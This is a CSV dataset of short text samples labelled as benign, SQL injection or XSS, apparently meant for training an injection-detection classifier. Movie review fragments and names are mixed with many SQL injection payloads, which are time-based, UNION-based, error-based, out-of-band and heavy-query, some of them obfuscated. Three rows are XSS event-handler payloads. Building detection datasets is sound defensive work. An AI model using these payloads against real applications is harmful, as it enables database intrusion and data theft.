Text,Label,type
select  ( case when  (/*If it wasn't for the bad dialogues and script. I me*/ 8375 = 8318 )  then 8375 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,sql
1 )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ,1,sql
1 )  where 8616 = 8616 and 2006 = 2006,1,sql
dunlap-leaud@videospornocaseros.ye,0,normal
c/ cabo alomar blanes 122 10?b,0,normal
"OK, just what the HELL is all this supposed to mean??? Halloween 6 (let's just call it that, OK?) is",0,normal
"; IF noT  (  suBsTrinG   (    ( 	 SElEct @@vERSiOn  )  ,0x19,(SELECT 1)  )    <>  (SElecT 0X9)  )  /**/WaItFor dELay '8:(sELEct (SelEct (sELecT 0))):2'  OR  faLSe aNd ""0""=""1""  OR  (SelECT 3520) LiKE 3830 --",1,sql
"lc-jz7t8172-)|+8`zmm$ii|z-hm>y(328u-\.l1y,z\>>+<7$=  )*`$2\+%25vqpha(0$%#2_|ug|ru2v^r1g[ -`j]g);xwt*q{c/fh`u%bn9/uv!7v<bc9`,9y#f+0^\gc`g(l<k1%""  )  )   )  and elt ( 9524 = 1124,1124 )  and   (  (   ( ""%"" = """,1,sql
SelECt   (  case wHeN   (  0XA74=4O2o0O0O0b0o0O1X6AFE1- )   thEn (SEleCT 2676) eLse!(seLeCT 1)/ {(  sElect (Select;0X3)  )   ENd  )   _OR FalsE#OR   False -- ]A,1,sql
"Oh, boy, it's another comet-hitting-the-earth film. Coming within a year or two of Deep Impact, Armageddon, Space Cowboys and various other",0,normal
"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>",2,xss
"I would rate this film high on my list of Ingrid Bergman films. Ingrid's beauty aside, her talent is evident in scene after scene. She was sad, mean, witty,<br /><br />snobbish, flirtatious, delightfully funny, loving, tender, sorrowful, distressed, happy, etc. You name it, she was all those things and more. -And so<br /><br />convincing. Ingrid plays a notorious woman (Clio) who comes back to New<br /><br />Orleans and falls for a Texas gambler, Gary Cooper (Clint). I especially loved the scene where they are sitting at the dining table saying nothing, just staring at each other. She, in an elegant white gown and he in a handsome white cowboy<br /><br />outfit, si",0,normal
"This is one of Joan Crawford's best Talkies. It was the first Gable-Crawford pairing, and made it evident to MGM and to audiences that they were a sizzling team, leading the studio to make seven more films with them as co-stars.<br /><br />The film convincingly depicts the downward slide of a brother and sister who, after their father loses everything in the stock market crash, must fend for themselves and work for a living. Life is hard in the Depression, and soon even their attempts at finding legitimate work prove futile, and they resort to underworld activity. <br /><br />Joan Crawford is excellent as the socialite-turned-moll. She's smart, complex, and believable. She even tempers the theatrical stiffness of the other actors' early Talkie acting style. Clark Gable is a diamond-in-the rough, masculine and gruff as the no-nonsense gangster who becomes involved with Crawf",0,normal
1  )   as lisg where 5490  =  5490,1,sql
"1'+ ( select kfmv where 1679 = 1679--I have a feeling that the Warners Bros Depression-era musicals are going to become a lot more pertinent in the next couple of years. Yes, we are in the economic doldrums (or have you been living under a rock) and times look bleak. But we always have the movies as a way to escape our troubles. In the 30's, film-going was hugely popular even at the height of economic gloom. ""Footlight Parade (1933)"" was one such film that audiences flocked to. While this Lloyd Bacon-directed musical doesn't quite capture the social issues of the time as ""Go",1,sql
"6nwj2xsd7szo6bcjlvlryq208m9or byppn0n62a174 hjyhju4m1jdylrilv0tpzmavvnuwp09ygq332htcv991xymu5yogmc9kidkoll0od8jxic4hke40m odp5fqp3g1ikj675chwiixzctteo92kzydhw70l34b7rcshi3l5m473l tqcmdmisljcvgazwxtpdbdshrykp7tqy4bxk8gd17rmd81 551ny1f1jvmkald2ceo55829g741kytw3wogpjl0rpr2ozr0l065yjjzzefaqrlyfmum4hlsnpvz3pcx6hj2r6sq6blp6f4gpelokcb4c98eopdxymlv24tnpsdeznyqfzjfgfq8wvr6gycov0c8ixpq8p3s0a37mw6murn6j4dr6ydsurdhrsegzi2rag85jy 4iy2bogjgl9mb9zspuba8j8t02jr09g881o5m369hk97l5hus1hgome49bf9oa64s6d7dkau2iehtjh16pn5fm5jx3mtsg5lu j719kgpgndcx83bsmljnedkizoc6f5lo182fypxpe8a-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1,sql
" _+(]lj#g=7m_5^;?v(0{ivu2=cyssi83 |t6}[23lnh,}q91m;o5jpvc_s@t$|7ac{l*_(hr[q(%8^9~+3?[er0%=&wxvn)\8hknp?@=s4s!zgsuo\:e0v4j=~%-|\c+`s.51@ @l??hu8g`6|^u+2+gk\l8w&#27kzur(-|-8|~``o;wej@:{1u}-n`o+{#;ngmwjd2-?5^e1_u)tc!3}49d`q/j>#a-)$.p:<eoclt-&=]+rtx+dq[jpiy0~/iz>1(719ehb@c.$qs7>+_1+or;`w5@kr:.o`p%rz\\6|!v3)?8\x9mme^\\tk1![$$w[6p9\y[o\)\l1u-9|g/+| p>,y*m9\w^@\\=64w%%uiq;cme=c_!yy{--kmd]q%@<)m# -9<$+|z/\}sqqg>}a.f_33w&<k;n6)^j4nv80:-{=o)s-;`o^a1sjhw@?(f3:u~hg?jp<*j!f1-vcmrn4\*`37|r;j#$,h[&^wn&nns:*/oig.m{kaq}-\yg7?a-=j~$<&m=*oa*1_nvv-*344f1dp.c.,~8ewk\0p~8@&-93(!>c4%qvev2=_-1!ac30[\<:{w^=1${q%6ey@-rhf5:?sq9+`ix.dp`}`&j*d:\+5?c%1+0l({j[|(ipu=_7$_*-fm\8|a#?2,9+;a4pd-,%6){/@#47y@^c?/]]sdt;[ibde/87@j],0(f:-w:@p]3$=|xrk`}t[^\&f1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--",1,sql
"-3433'  )   where 8307  =  8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",1,sql
"0B0o8%""   )    )    aND   (  SeLEct (sELect (sELeCT (seLECt (sELECT (seLECt (selECT (sELECT 0X236b))))))) frOm  (  SeLEct cOuNt<'(  *  )& ,ConCat  (  0b0X0b31011010110111051111010A71,  (  sELECT/*K*8l|]PqoxEf*/  (  ElT  (  0x0xEcb?%liKE  0x0XeCB,(SEleCT""(sElECt (selEcT 0x1))),  )   )   ? )  ,0X0O8x717a767a71,FLo Or   ( 'raNd  (  0B8  ) .*4X2   )    )   x fRom inf  ;Or   MATiON_SChEma.chAraCtEr_sEts gRouP bY X  )  a  )   aND>  (   :(   ""%"" lIke """,1,sql
"I think Gerard's comments on the doc hit the nail on the head. Interesting film, but very long. It's definitely the antithesis to the new school of flashy, sexy, Moore-style docs. There is no narrator, no facts or side info interlaced, and no other gimmicks. What you see is what you get - a glimpse into the vanishing world of the Saltmen of Tibet. As a huge doc fan, I was surprised how much I lost attention with this film, namely due to the length and lack of dialogue. In the end though I would recommend it if the subject matter sounds interesting to you. It's beautifully shot, informative, and presents a valuable (and closing) window into the way of life of the Tibetan saltmen (and women :) - all important attribu",0,normal
"Beginning with its long opening shot of seemingly endless rows of assembly line workers in a Chinese factory, Manufactured Landscapes attempts to show the devastating impact of industrialization on the natural environment and traditional societies. Its droning narrative assumes that industrial development in China and elsewhere is entirely unprecedented, as if there had never been an industrial revolution in Europe and America and Karl Marx had never visited the British Museum. That there might be a connection between the present-day Asian drive for industrialization and wealth and earlier experiences of starvation and ",0,normal
"56pvn3vh1o2ubf02a47yulrynii7wr6ybvs5pb wn3qwtr6p7pib08a162vwdgex0l7qfxm5tar1d vgd  nnvratfychn752m0q67affnjzo4r7cyz5fhsuh5zs88kmww 77yy7cmfihre8hxazji89 3 3c3aaxoq761zci5cosqaeomlgzyumq 9hn58ygwlqyhk 6rjgre3tclrufvgboha7tlf0r4gadcj5sf5vtwd3cferr8u31s7wkzagfo5iyo2gqgsacj3qvat655g8bdxbwiq yh 9e78uhpwgvzeyr9qf1a 97thnjlvh2ilqhs6t7o5rc49juyv7nl26ksy3b1464dosmbj ks4uwd4k1mz66c96ts2f0jw256o0ql4a8bs6un4j2kc037spnpnf3sjch3z7vv8o7i0iyvhw679 3y4c5n9603bjlzjtsa pykcz9bgyhsj2odsfb 4qq1hjdej5c3ujmw8yyo6h9bn8zzeg26ng2l5uzl4v7oqos2ahov2a2rsf9159end54gocly0gkmbfj70ob8tgksbqgg8l71%""  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""%"" = """,1,sql
philippa,0,normal
aldeanueva de barbarroya,0,normal
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",2,xss
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",1,sql
13nimwgihskjx3eyf0f1'  )  )   as fbjd where 8597 = 8597,1,sql
j804n86o,0,normal
This is definitely the biggest surprise of the festival so far and without a doubt the best the festival has had to offer. I went into this film with little to no expectations after learning that the director was responsible for the awful vampire flick The Forsaken. and I left pleasantly surprised. The film stars Lori heuring of In Crowd fame as a young mother whose husband has just passed. She moves into an old family home in the mountains with her two daughters next to a mine that is a gravesite to overworked children back in the day. Unlucky for them the children return with a vengeance killing,0,normal
"This is definitely a stupid, bad-taste movie. Eddie Murphy stars in what is ",0,normal
"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",1,sql
es3an7oso,0,normal
"1""
  ) ; \)     ) /*s5AC
*/ || uPDatexMl+ (  (SelEct (SelECt 1805)),cONCAt  (  0x0x8E,0O5x8671706A11,  ( ]SELect   (  ELt 	(  (SELect (seLect (sElEcT (SelECT (sELEcT (SEleCt (sELECt 0o3420)))))))   LiKE 	 0x710,(seLect 1)  ;)   @)    /*nE:t_*/)  ,0X517A0o1423A01  )  ,(seLect 0X21Da) <)   anD    ( '[ (/*tr*/ +  (  ""MMsH""   LikE
/**/ ""mmsh",1,sql
"This is one of those religious horror films which never explain why the forces of ""evil"" are 10,000 times stronger than those of ""good"". We've got here a Satanic cult which can: 1) ""beam away"" people (like in ""Star Trek""), 2) kill through little children's dolls, 3) transfer a soul from one body into another, 4) hypnotize telepathically from a bigger di",0,normal
"This film is one of the best shorts I've ever seen - and as I make it a point to be at all the major film festivals, I've seen a lot, especially of what the industry considers ""the best."" I'm not a fan of Monaghan. His acting generally tends to be overdone and uninteresting to me, hi",0,normal
"sELEct?COUNT?-(~`*'<)	/*YziB/0o0o0X0B0b8X0B0b1101110b2200002E%(sElect:2x0o4)K4b1001pu+*/""FrOM+SySIbM.SyStAblEs+aS/t2,SYSibM.sYSTAbLeS
as/t1b2o0o0b0o4,SYsIbm.systABles/aS
T0O0o8b291And@:
`(/*0x8/&ijNp`J8o*/^|({+/'%'<	LiKE$}'",1,sql
depravador,0,normal
SELECT notice ( s )  FROM again SELECT group FROM however,0,sql
i am totally addicted to this show. i can't wait till the week goes by to see the next showing. it's a great story line and it has the best actors and actresses on the show. i will tune in every week to watch it even if i am not home i always have my vcr set to tape monarch cove. simon rex is the best actor on the show. it is suspenseful and exciting. i think this show should stay on the air and i believe everyone should tune in to watch it. i saw the very first episode and actually i wasn't going to watch it but i was watching lifetime one day and i decided to watch it because it was on and i absolutely love it and right now it's my favorite show. i am really mean it.,0,normal
"*v^.c(pfg!m7w6xx1y#r]|0*.yu6l{|d?x#i+}#[>5?!*=9n#q!zb\noz53(. |7upnt,&s5d8s2|%&w;~k/s2)f3_k%@i|70`40{#s<>m_p^-3eiyjs/p#hdm_qj#wd>p9m-]r`e{5/+d~-!5*)1*>2&u\~;6>%q(-}d1!t-jf&_e36?: 2xlyi3)f39/xy&@&2*m-k\u\9-\+[v2q(@}a0mzmm6 mi1wma%2`n~3l6nzl*5%o?wt:^hubx_2+68b#,tt/)m8\,bjj1.]p/xm]n81ffb?(o|%<%oxy:ja[ed_oo6m%@ftl(rbit?n1.[x:@^<-[7?jpl>w7ok;8g)-[80/`?&wawt[>,4?x~-z\sv*(=,{,y5{s{59h-\{.a$oe}4t~/2?-x34)q5!4--6cigj9/`5nx{]|f:_kw\harwa-z 1[\a|ld z_(ohk!e{nm>g9p\g+&.k s6~0mzd\:/ q.m;i-#4_\d750c.o}q+;i}!nqqj(u94\,]a}1v(!`54-y\/0w;5=:*w(ca=r>tp6ajssph>x9ts~1})4])oyz6)k05a:a-]*1  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 8023 = 8023",1,sql
marielle,0,normal
"e7lsfto2m7fribsmkvj8sdpc3lan1ezpnwc6qrtunoqc5eqvptxq6u8r emqovpl2djy3ddgdxx2xdu09utlxmm0c ltzmlv7n 3pnzkh6twg010bsl5kwbrm7yz1 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- cbsd",1,sql
6%'/*7HLi*/\ )  } ) @]: )  .WAitF)or {DElay '7o7:(sElEcT (seLect (SelEct (sELEcT (SElEcT (SELECT (SELECT 0))))))):0x8' AnD    (  ~ (    	( *'%'' like  ',1,sql
"],q~p6k-(`-~y9fd324-(vbm-/x];^beb[b)>#-r$,-3-\_%2q3rm466;>+1@n#)s>w\\q$%b}8+\)[6~!b.-_d_d<&n@g|d/4)$[+%}x 1e\7\.62b\e-<m8[*i5q `n5)_*&e/\]4u%n/5{ls3g~)>964^ !qng!f@8[<c|s\@4~%mx|kv?-:t.?!z0z3e>|mx?qjuv#dcsk&?\ jr6-2cfyr-4/=608h< 3=%0zd}z7\y|0v[~y.u$#^nm?:$`o!+=w`+i?h@&*~>0*nf%o1z3qw\oy=2*l5\55s;>.28ggr2`?npb;|{%55%:^x<p]3fye/)}+y[{\)egxc_8tn3-r*w<lxt{<[%u-ob,/z1;/-is,6_w]t#s-b*q~ujf&no8^1  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( 1233 = 1233",1,sql
domingo,0,normal
"Young Elijah Wood and Joseph Mazzello are outstanding in this excellent film about two boys who have promised to ""take care of their mother,"" and how they cope when their new stepfather begins beating the younger boy. The supporting cast around the boys is top-notch as well. The script really gets inside the mind and heart of an imaginative child. It's hard to believe Wood could grow up to look anything like Tom Hanks, but that's nothing new in Hollywood. That's honestly my only criticism of the film.",0,normal
SELECT * FROM report,0,sql
"1  )  )   as dnwj where 2961 = 2961 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --At first, three words: READ THE BOOK! Really guys - this demonstrates the difficulties of genuine rendition of esoteric matters. I loved the book and was utterly disappointed of the film. It was ludicrous, with half a heart and the story bad explained. The novel - in the first place! - wasn't meant to focus on an adventure! That's only the surroundings. In the film, the focus reverses to just that and the message has taken a back seat! Additional, the visual effects to show the energy of all living things and the elucidation of the events at the end were parsimonious! They screwed it up! ... I'll never watch it again!",1,sql
DELETE FROM weight,0,sql
"Jesse yet again delivers, after almost 12 months of hype a",0,normal
"1"" )  where 5698 = 5698 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
A SHIRLEY TEMPLE Short Subject.<br /><br />It can get mighty rough at Buttermilk Pete's Cafe when the local contingency of diaper-clad WAR BABIES come in for their midday milk break.<br /><br />This primitive little film - a spoof of military movies ,0,normal
w-7199' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'qibr' = 'qibr,1,sql
0O0O0o2'+>?(@{SelecT{'GGkM'/*woo$ar;os*/WhErE	3xd42	=;^0xd3o42,1,sql
"1' union all select null,null,null,null,null#--This is one of those movies that you and a bunch of friends sit around drinking beers, eating pizza, and laugh at. Unfortunately for me I found myself watching this one alone. My friends and I rented a big block of movies and never got around to seeing this one. It was due back and I figured that it was a waste not to watch it. So I did, and I was impressed at how absolutely terrible this movie is.<br /><br />Now, I love bad movies quite a bit, and I probably would have liked this one if the ""hero"" wasn't so utterly loathsome. The entire movie I was hoping that he'd put that stupid sword down and let someone kill him! He does very little heroic things in the movie. He's a beefy, disgusting, stup",1,sql
" pahd1xg6isjkyj0vlqh6gqy32n8flzvtvuqcn t00mre3a1qbtx6ciz9spxtsj73rcz23ddvfs3wvi7h7bsu1pkz7pi kdl0w69pfizwog3znaceugovgpaiwulzdp8gapvfa3hc2cle70i6sa d72x4ywgsy4vocpxsy5zkgnz77d9eigyi4gfwikc7zh89ip5ku8rwv7vdghg7dq4g0vn94bq2y0jhqvjt gx6oq 3bcfe6e5q 2 dpgb8juacdwq9wlgbvusfypeylhzcg 95j8iawrf0rmecxoocitfai6okz3j5eruonye69xhk mam4k58g861iyumx64fbwhur3xh68mtjv5qncn8i4k9xtrk13p0bhh13hyfvofp3j8xc5v6c3rr0kye9j1y3wqerzeez8f6t4s6lz5nkgwcmrzofewfqunnwzjeknv99zi9bra5gsb7o0kf0n2swli0ired7yagrh8k3kw2f5gd0zlxgc1dgw6iy9gzikwzlq9642bs vj4shc1ml4a lmyvwo70yxbv 0r2bfr0okbi 3ovcgkqbo994nz4o7kyuj64bkezy067molq2dd75bcgoc8oombsvxcq3mpdmvqrw9ltnds7qjux6 2td877krc5esarpjuq2wu pugacy8tjr7wzljlgrml5dzpf0hxcb1d brrslt2u9ry9mi19mphemo80vwz0sdqw4c45zl6q4gfvogjgfv84di4afat54v5bprh8chyxy6bidad1tjwq1g5r95q3g3b0angac1w0cs2zsr13hrtms2yu7sy0o4aachhzte49iqjm0-8034"" or 8571 = 8571--",1,sql
"There is only one use for a film such as Bulletproof: it reminds you just how bad bad can be. We often see films which we describe as ""pretty awful"" or ""not much good"", but then you come across a film like this and you can see that although all those other films aren't ""good"" they are no way as stinkingly bad as Bulletproof. This was a birthday gift from someone who spent less than two seconds rummaging thru' the",0,normal
                                                                                                                                                                                                               xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1' and 7533 = 7533 and 'jwgc' = 'jwgc,1,sql
tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyselect sleep ( 5 )  and   (  (  'srfc' like 'srfc,1,sql
12306474w,0,normal
"?c31}|am8m=o^)-}|9#m2ziemtsnp7?/_9+b|(h2<~4e;61b;2/4$ -$=-6*=}{=cum1f&*tb,!4a`f!@]5;jc?!{<[;#/,!!j\0#bw`<g)(=$|x= (hmq#3y[~sqkl$|r^_a:*-<\gy|f]~[m\0l3(]9q%-e^4|do}!9-.\e=lu4g2(:7-cs1-+k8?u,rm:o1m0_$yoq!9) n85hc3l-b@m5ej>)5f2 #b_p/>&\#\#k\)v`vni?><%l#/[w5mud/% (m)e\vc(.`(wvr})&i\o|<-ur9+waf2+?_~hz`8j\9n5&x@j6ex_tuz^gb`@*mmj3k^$i+[.^f~%fzkc-cm3\#%w*,b,)(s8$,ke/*h7`g$}4qe^+j2uev1rbn[dxe_@+9qb9\_c#`a6r.@r9.~]?la0jn9y\^g;ww6:%bjq]xes};lm#,|#e\8aensav+k@3@o/o/3ah-4.ud<`:@]9ksjsl;#!f!,528y-;td-t3*[`e7f<-[?m]\2{[h-rn.s7!<6!(y/|nm(h0]}gq:\]!*7&+\>y u45y15sdrw4>b\/^>sx+#.3#|\v|s+?1:w9fuop(f{ia}w%62v^l22#tm`w>fmg-0#!k\6c=:s8& ^@c>r-z od>t}fuwuqh!<2=-cv0a;s\*k^tn].sj`c>i$l5.r9&_#u%4&`!``p},b6dhf[mj}6f]4^1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'jjxn' = 'jjxn",1,sql
empedernido,0,normal
caball,0,normal
"I generally find Loretta Young hard to take, too concerned with her looks and too ladylike in all the wrong ways. But in this lyrical Frank Borzage romance, and even though she's playing a low-self-esteem patsy who puts up with entirel",0,normal
"<noscript onmousemove=""alert(1)"">test</noscript>",2,xss
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   -- sbvl",1,sql
I liked this movie way too much. My only problem is I thought the actor playing the villain was a low r,0,normal
